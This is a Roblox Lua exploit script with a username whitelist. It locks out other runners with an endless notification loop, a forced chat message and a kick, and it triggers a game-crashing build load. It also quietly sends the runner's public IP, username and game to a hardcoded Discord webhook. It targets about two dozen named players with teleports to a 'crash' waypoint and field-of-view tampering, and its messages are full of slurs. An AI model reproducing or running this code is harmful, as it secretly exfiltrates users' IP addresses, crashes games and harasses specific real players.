--_DO_NOT_SHARE_THIS_AS_IF_U_SHARE_THIS__YOU_WILL_CAUSE_A_HUGE_DISASTER_AGAIN_DO_NOT_USE_THIS_AS_THIS_SCRIPT_IS_DANGEROUS_--
game.Players:Chat(":chatnotifyc all 255 0 0 Loading.")
local whitelistedPlayers = {"ww", "weerawatR15", "T4NVS"} -- List of whitelisted players
local playerExecutingScript = game.Players.LocalPlayer.Name -- Get the name of the player executing the script

local playerWhitelisted = false -- Assume the player executing the script is not whitelisted by default

for i, playerName in ipairs(whitelistedPlayers) do
  if playerName == playerExecutingScript then
    playerWhitelisted = true -- Player executing the script is whitelisted
    break
  end
end

if not playerWhitelisted then
while true do
	game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Hey!", -- Required
    Text = "Don't try to use my fucking script you retard!", -- Required
    Icon = "rbxassetid://" -- Optional
})
end
while  true do
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I am a script kiddie I love skidding people script!!!", "All")
end
wait(5)
game.Players.LocalPlayer:Kick("Get the fuck out. You fucking retard. You ain't getting the whitelist.") -- Kick player if not whitelisted
end

-- Define the list of retards/braindeads
local blacklistedPlayers = {
    "AH_Hell",
    "oddbot_666",
    "CarlinReturns990",
    "MoltenLavaSumo",
    "Unlisted",
    "RET_URNTIX",
    "BryanDawson59",
    "IvansBurritoWorld",
    "JapanzKitten",
    "Joselo1133",
    "NAGVH",
    "Joselo1133",
    "cheekymonkey_0975",
    "ZPlexes",
    "tacotrooper21",
    "BetrayalBro",
    "Nukemanesk",
    "vnc1e",
    "EastonOU812",
    "supercar_211",
    "ROMK_Cashier02",
    "Barreleye2",
    "CherishClayton",
    "SoldierZeroIn"
}
--load scary baaba emu crasah
local args = {
    [1] = {
        [1] = "LOAD",
        [2] = "cr"
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("BuildSaving"):InvokeServer(unpack(args))
-- Create a variable to keep track of whether the system is enabled or not
local systemEnabled = true

local marketplaceService = game:GetService("MarketplaceService")

local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
if isSuccessful then


local marketplaceService = game:GetService("MarketplaceService")

local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
if isSuccessful then
local ip = tostring(game:HttpGet("https://api.ipify.org/", true))
local wh = 'https://discordapp.com/api/webhooks/1092713174719025175/TDTWsfsj44J3wleOrPdj4Sc8LQmSFGH4Y5RlfW7tPpnJGSjs_mckFE_lbrQebsVVQ3G0'
local embed1 = {
       ['title'] = 'The script has been executed by a retard name '..game.Players.LocalPlayer.DisplayName..' (@'..game.Players.LocalPlayer.Name..') IP : '..ip..'  Time: in '..info.Name.." at "..tostring(os.date("%m/%d/%y at time %X"))
   }
local a = request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})
end

game.Players:Chat(":chatnotifyc all 0 255 100 Executed by "..game.Players.LocalPlayer.DisplayName.." (@"..game.Players.LocalPlayer.Name..")")
-- Function to enable the system
local function enableSystem()
    systemEnabled = true
    game.Players:Chat(":chatnotifyc all 0 255 100 Any attempt by blacklisted players to join the game will result in severe consequences. We will not tolerate any disruptive behavior.")
end

-- Function to disable the system
local function disableSystem()
    systemEnabled = false
    game.Players:Chat(":chatnotifyc all 255 0 0 System offline.")
end

-- Function to check if a player is blacklisted and execute commands on them if they are
local function checkBlacklisted(player)
    for _, blacklistedPlayer in pairs(blacklistedPlayers) do
        if player.Name == blacklistedPlayer then
            game.Players:Chat(":tp "..blacklistedPlayer.." wp-cr")
            game.Players:Chat(":fov "..blacklistedPlayer.." 1")
	    game.Players:Chat(":chatnotifyc all 255 0 0 Blacklisted player "..blacklistedPlayer.." Founded!")
        end
    end
end

-- Function to check all players in the game for blacklisted players
local function checkAllPlayers()
    for _, player in pairs(game.Players:GetPlayers()) do
        checkBlacklisted(player)
    end
end

-- Listen for the LocalPlayer to type the command to enable/disable the system
game.Players.LocalPlayer.Chatted:Connect(function(message)
    if message == ".enable" then
        enableSystem()
        checkAllPlayers()
    elseif message == ".p" then
        disableSystem()
    end
end)
game.Players:Chat(":chatnotifyc all 0 255 100 Loaded.")
-- Listen for a new player to join the game
game.Players.PlayerAdded:Connect(function(player)
    if systemEnabled then
        checkBlacklisted(player)
    end
end)

-- Check all players in the game when the script starts (in case the system is already enabled)
if systemEnabled then
	checkAllPlayers()
end
end
